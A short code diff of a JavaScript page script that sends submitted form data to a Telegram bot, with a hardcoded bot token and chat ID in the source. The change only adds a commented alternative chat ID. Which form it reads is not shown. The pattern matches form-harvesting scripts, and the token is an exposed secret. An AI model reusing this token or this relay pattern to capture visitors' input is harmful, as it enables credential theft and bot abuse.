@@ -9,7 +9,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     function sendDataToTelegram(formData) {
         const botToken = '7016228596:AAFEVtiH2Jl8za7cUWA9WDc5XXxkV0zkMqg';
-        const chatId = '996784383';
+        const chatId = '996784383'; /*706705597*/
         const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         const message = `
